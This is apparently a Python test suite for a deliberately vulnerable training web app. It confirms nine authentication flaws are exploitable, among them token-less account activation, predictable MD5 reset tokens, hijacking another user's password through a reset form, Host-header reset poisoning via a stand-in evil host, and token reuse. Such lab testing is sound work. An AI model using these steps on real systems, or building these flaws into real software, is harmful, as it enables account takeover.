"""
SecureHub VAPT Lab — Phase 3 Automated Verification Suite (Vulnerabilities 9–17)
Tests vulnerabilities 9 through 17 to ensure genuine exploitability and verification,
while maintaining full application stability and legitimate workflows.
"""

import io
import sys
import hashlib
import unittest
from datetime import datetime, timedelta
from app import app, get_db
from reset_lab import reset_environment


class Phase3VulnerabilityVerificationTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        print("\n" + "=" * 70)
        print(" VERIFYING PHASE 3 VULNERABILITIES (9–17)")
        print("=" * 70)
        reset_environment()

    def setUp(self):
        self.app = app
        self.app.config["TESTING"] = True
        self.client = self.app.test_client()

    # -------------------------------------------------------------------------
    # VULN-09: Weak Password Policy & Insufficient Complexity Enforcement
    # -------------------------------------------------------------------------
    def test_09_weak_password_policy(self):
        """Verify registration and reset accept extremely weak 3-character simple passwords."""
        print("\n[*] Testing VULN-09: Weak Password Policy & Insufficient Complexity Enforcement...")
        client = self.app.test_client()

        # 1. Register with simple weak password '123'
        resp = client.post("/register", data={
            "username": "weak_pass_user",
            "email": "weak_pass@training.local",
            "password": "123",
            "confirm_password": "123",
            "display_name": "Weak Pass User"
        }, follow_redirects=True)
        self.assertEqual(resp.status_code, 200)
        self.assertIn("Account created successfully", resp.data.decode("utf-8"))

        # Verify record in database
        with self.app.app_context():
            db = get_db()
            row = db.execute("SELECT password FROM users WHERE username = 'weak_pass_user'").fetchone()
            self.assertEqual(row["password"], "123")

        print("    [PASS] VULN-09 Verified: Registration accepted 3-character weak password '123'.")

    # -------------------------------------------------------------------------
    # VULN-10: Email Verification & Account Activation Bypass
    # -------------------------------------------------------------------------
    def test_10_email_verification_bypass(self):
        """Verify unverified accounts can be activated by calling /activate without a token."""
        print("\n[*] Testing VULN-10: Email Verification & Account Activation Bypass...")
        client = self.app.test_client()

        # Register unverified user
        client.post("/register", data={
            "username": "unverified_user_10",
            "email": "unverified10@training.local",
            "password": "validpassword123",
            "confirm_password": "validpassword123"
        })

        # Login attempt before activation -> Blocked
        login_fail = client.post("/login", data={
            "username": "unverified_user_10",
            "password": "validpassword123"
        }, follow_redirects=True)
        self.assertIn("pending email verification", login_fail.data.decode("utf-8"))

        # Bypass: Invoke /activate with email parameter only (token omitted)
        activate_resp = client.get("/activate?email=unverified10@training.local", follow_redirects=True)
        self.assertIn("Account verified and activated successfully", activate_resp.data.decode("utf-8"))

        # Login now succeeds
        login_success = client.post("/login", data={
            "username": "unverified_user_10",
            "password": "validpassword123"
        }, follow_redirects=True)
        self.assertIn("Welcome back, unverified_user_10!", login_success.data.decode("utf-8"))
        print("    [PASS] VULN-10 Verified: Omitting token parameter completely bypassed activation check.")

    # -------------------------------------------------------------------------
    # VULN-11: Automated Account Mass Creation (Lack of CAPTCHA/Throttling)
    # -------------------------------------------------------------------------
    def test_11_mass_account_creation(self):
        """Verify registration permits unrestricted automated account mass-creation."""
        print("\n[*] Testing VULN-11: Automated Account Mass Creation...")
        client = self.app.test_client()
        batch_size = 12

        for i in range(batch_size):
            resp = client.post("/register", data={
                "username": f"bot_account_{i}",
                "email": f"bot_{i}@training.local",
                "password": "botpassword123",
                "confirm_password": "botpassword123"
            }, follow_redirects=True)
            self.assertEqual(resp.status_code, 200)
            self.assertIn("Account created successfully", resp.data.decode("utf-8"))

        with self.app.app_context():
            db = get_db()
            count = db.execute("SELECT COUNT(*) as cnt FROM users WHERE username LIKE 'bot_account_%'").fetchone()["cnt"]
            self.assertEqual(count, batch_size)

        print(f"    [PASS] VULN-11 Verified: Created {batch_size} accounts sequentially without CAPTCHA or throttling.")

    # -------------------------------------------------------------------------
    # VULN-12: Predictable Password Reset Token & Insufficient Entropy
    # -------------------------------------------------------------------------
    def test_12_predictable_reset_token(self):
        """Verify password reset token is deterministic and based on MD5(username + minute timestamp)."""
        print("\n[*] Testing VULN-12: Predictable Password Reset Token & Insufficient Entropy...")
        client = self.app.test_client()

        # Request recovery for charlie
        client.post("/forgot-password", data={"identity": "charlie"}, follow_redirects=True)

        with self.app.app_context():
            db = get_db()
            user_row = db.execute("SELECT reset_token FROM users WHERE username = 'charlie'").fetchone()
            actual_token = user_row["reset_token"]

            # Compute predicted token using minute timestamp
            time_key = datetime.now().strftime("%Y%m%d%H%M")
            predicted_token = hashlib.md5(f"charlie_{time_key}".encode()).hexdigest()

            self.assertEqual(actual_token, predicted_token)

        print(f"    [PASS] VULN-12 Verified: Token {actual_token} matched predictable MD5(username + minute).")

    # -------------------------------------------------------------------------
    # VULN-13: Password Reset Authorization & Account Hijacking
    # -------------------------------------------------------------------------
    def test_13_password_reset_authorization_hijack(self):
        """Verify an attacker can use their own reset token to overwrite a victim's password."""
        print("\n[*] Testing VULN-13: Password Reset Authorization & Account Hijacking...")
        client = self.app.test_client()

        # Step 1: Attacker (charlie, user_id=3) requests reset to get valid token
        client.post("/forgot-password", data={"identity": "charlie"}, follow_redirects=True)

        with self.app.app_context():
            db = get_db()
            charlie_row = db.execute("SELECT reset_token FROM users WHERE username = 'charlie'").fetchone()
            charlie_token = charlie_row["reset_token"]

        # Step 2: Attacker submits reset password with charlie_token, but targets Bob (user_id=2)
        hijack_resp = client.post("/reset-password", data={
            "token": charlie_token,
            "target_user_id": "2",  # Victim: Bob Brown
            "new_password": "hijacked_bob_pw_999",
            "confirm_password": "hijacked_bob_pw_999"
        }, follow_redirects=True)
        self.assertEqual(hijack_resp.status_code, 200)

        # Step 3: Verify Bob's password in database was overwritten
        with self.app.app_context():
            db = get_db()
            bob_row = db.execute("SELECT password FROM users WHERE id = 2").fetchone()
            self.assertEqual(bob_row["password"], "hijacked_bob_pw_999")

        # Step 4: Verify attacker can now log in as Bob
        bob_login = client.post("/login", data={
            "username": "bob",
            "password": "hijacked_bob_pw_999"
        }, follow_redirects=True)
        self.assertIn("Welcome back, Bob Brown!", bob_login.data.decode("utf-8"))

        print("    [PASS] VULN-13 Verified: Attacker token successfully hijacked victim account (Bob).")

    # -------------------------------------------------------------------------
    # VULN-14: Insufficient Token Expiration & Prolonged Lifetime
    # -------------------------------------------------------------------------
    def test_14_insufficient_token_expiration(self):
        """Verify password reset token has an excessively prolonged lifetime (30 days)."""
        print("\n[*] Testing VULN-14: Insufficient Token Expiration & Prolonged Lifetime...")
        client = self.app.test_client()

        client.post("/forgot-password", data={"identity": "alice"}, follow_redirects=True)

        with self.app.app_context():
            db = get_db()
            alice_row = db.execute("SELECT reset_expiry FROM users WHERE username = 'alice'").fetchone()
            raw_expiry = str(alice_row["reset_expiry"])
            try:
                expiry_dt = datetime.strptime(raw_expiry, "%Y-%m-%d %H:%M:%S.%f")
            except ValueError:
                expiry_dt = datetime.strptime(raw_expiry, "%Y-%m-%d %H:%M:%S")

            remaining_days = (expiry_dt - datetime.now()).days
            self.assertGreaterEqual(remaining_days, 29)

        print(f"    [PASS] VULN-14 Verified: Reset token lifetime is prolonged (~{remaining_days} days).")

    # -------------------------------------------------------------------------
    # VULN-15: Password Reset Poisoning via Host Header Injection
    # -------------------------------------------------------------------------
    def test_15_password_reset_poisoning_host_header(self):
        """Verify password reset link is constructed with client-controlled Host header."""
        print("\n[*] Testing VULN-15: Password Reset Poisoning via Host Header Injection...")
        client = self.app.test_client()

        evil_host = "attacker-domain-controlled.evil.local"
        client.post(
            "/forgot-password",
            data={"identity": "alice"},
            headers={"X-Forwarded-Host": evil_host},
            follow_redirects=True
        )

        with self.app.app_context():
            db = get_db()
            email_row = db.execute("""
                SELECT body FROM dispatched_emails 
                WHERE recipient = 'alice@training.local' 
                ORDER BY id DESC LIMIT 1
            """).fetchone()

            body = email_row["body"]
            self.assertIn(f"http://{evil_host}/reset-password", body)

        print(f"    [PASS] VULN-15 Verified: Injected Host header reflected in dispatched reset link: {body}")

    # -------------------------------------------------------------------------
    # VULN-16: Reset Token Reuse & Lack of Single-Use Enforcement
    # -------------------------------------------------------------------------
    def test_16_reset_token_reuse(self):
        """Verify reset token remains valid in the database after successful use and can be reused."""
        print("\n[*] Testing VULN-16: Reset Token Reuse & Lack of Single-Use Enforcement...")
        client = self.app.test_client()

        # Request reset for charlie
        client.post("/forgot-password", data={"identity": "charlie"}, follow_redirects=True)

        with self.app.app_context():
            db = get_db()
            token = db.execute("SELECT reset_token FROM users WHERE username = 'charlie'").fetchone()["reset_token"]

        # First reset usage
        resp1 = client.post("/reset-password", data={
            "token": token,
            "target_user_id": "3",
            "new_password": "first_new_password",
            "confirm_password": "first_new_password"
        }, follow_redirects=True)
        self.assertEqual(resp1.status_code, 200)

        # Second reset usage with the exact SAME token
        resp2 = client.post("/reset-password", data={
            "token": token,
            "target_user_id": "3",
            "new_password": "second_reused_password",
            "confirm_password": "second_reused_password"
        }, follow_redirects=True)
        self.assertEqual(resp2.status_code, 200)

        # Verify Charlie's password is now second_reused_password
        with self.app.app_context():
            db = get_db()
            pwd = db.execute("SELECT password FROM users WHERE username = 'charlie'").fetchone()["password"]
            self.assertEqual(pwd, "second_reused_password")

        print("    [PASS] VULN-16 Verified: Token successfully reused to execute multiple password resets.")

    # -------------------------------------------------------------------------
    # VULN-17: Session Termination on Password Reset
    # -------------------------------------------------------------------------
    def test_17_session_termination_on_password_reset(self):
        """Verify existing active sessions remain valid after user's password has been reset."""
        print("\n[*] Testing VULN-17: Session Termination on Password Reset...")
        # Client A logs in as Bob
        client_a = self.app.test_client()
        client_a.post("/login", data={"username": "bob", "password": "hijacked_bob_pw_999"}, follow_redirects=True)

        # Client A verifies access to dashboard
        dash_a = client_a.get("/dashboard")
        self.assertEqual(dash_a.status_code, 200)
        self.assertIn("Welcome back, Bob Brown!", dash_a.data.decode("utf-8"))

        # Client B triggers password reset for Bob to a new password
        client_b = self.app.test_client()
        client_b.post("/forgot-password", data={"identity": "bob"}, follow_redirects=True)
        with self.app.app_context():
            db = get_db()
            bob_token = db.execute("SELECT reset_token FROM users WHERE username = 'bob'").fetchone()["reset_token"]

        client_b.post("/reset-password", data={
            "token": bob_token,
            "target_user_id": "2",
            "new_password": "bob_final_pass_456",
            "confirm_password": "bob_final_pass_456"
        }, follow_redirects=True)

        # Client A requests /dashboard again -> Still authenticated! Session was NOT terminated!
        dash_a_again = client_a.get("/dashboard")
        self.assertEqual(dash_a_again.status_code, 200)
        self.assertIn("Welcome back, Bob Brown!", dash_a_again.data.decode("utf-8"))

        print("    [PASS] VULN-17 Verified: Password reset failed to terminate prior active session.")


if __name__ == "__main__":
    suite = unittest.TestLoader().loadTestsFromTestCase(Phase3VulnerabilityVerificationTests)
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    if result.wasSuccessful():
        print("\n" + "=" * 70)
        print(" ALL 9 PHASE 3 VULNERABILITIES VERIFIED SUCCESSFULLY!")
        print("=" * 70)
        sys.exit(0)
    else:
        sys.exit(1)
